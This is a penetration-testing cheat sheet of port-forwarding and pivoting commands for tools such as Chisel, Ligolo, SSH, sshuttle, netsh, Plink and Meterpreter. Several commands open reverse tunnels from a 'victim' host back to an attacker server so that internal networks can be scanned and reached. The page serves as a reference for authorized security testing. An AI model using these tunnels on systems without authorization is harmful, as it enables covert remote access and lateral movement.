# Port Forwarding Examples


## Chisel https://github.com/jpillora/chisel
First start the server on our machine. 
```bash
chisel server -p 8000 --reverse
```
And then from our victim.
```bash
./chisel client 10.10.10.3:8000 R:socks
```
Our machine now has a listener on port 1080 which is a SOCKS5 proxy through the chisel client. 

## Ligolo https://github.com/sysdream/ligolo
On your attack server.
```bash
./bin/localrelay_linux_amd64
```
On the compromise host.
```bash
> ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
```
Once the connection is established, set the following parameters on the ProxyChains config file (On the attack server):
```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5     127.0.0.1 1080
```
Profit.
```bash 
$ proxychains nmap -sT 10.0.0.0/24 -p 80 -Pn -A
$ proxychains rdesktop 10.0.0.123
```
## SSH dynamic port forward 

```bash
ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command
```
## SSH double pivots from one network to another
SOCKS proxy over two hops into internal network.
```bash
ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target
```
## SSH remote port forwarding
Forward a single port on the remote machine to a port on our box.
```bash
ssh -R 9000:localhost:8001 username@hostname
ssh -R 2222:localhost:22 username@hostname - SSH
ssh -R 2223:localhost:5902 username@hostname - VNC
autossh -M 20000 -f -R 2222:localhost:80 username@hostname
```
## SShuttle https://sshuttle.readthedocs.io/en/stable/usage.html

To sshuttle into an internal network and forward all traffic:
```bash
sshuttle -r user@10.10.10.10 10.1.1.0/24 -vNH -e 'ssh -i id_rsa'
```

## Windows netsh 

```powershell 
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport

netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
```

## Plink

```powershell
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389    --> exposes the RDP port of the machine in the port 3390 of the SSH Server
plink -l root -pw mypassword 192.168.18.84 -R
plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
```

## Meterpreter portfwd
 https://www.offensive-security.com/metasploit-unleashed/portfwd/
 forward remote port to local address.
```bash
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali > rdesktop 127.0.0.1:3389

or

portfwd list
portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445

or

run autoroute -s 192.168.57.0/24
use auxiliary/server/socks4a
```

## References
https://chryzsh.gitbooks.io/pentestbook/content/port_forwarding_and_tunneling.html

https://blog.ropnop.com/

https://www.toshellandback.com/2017/02/11/psexec/

https://blog.ropnop.com/practical-usage-of-ntlm-hashes/
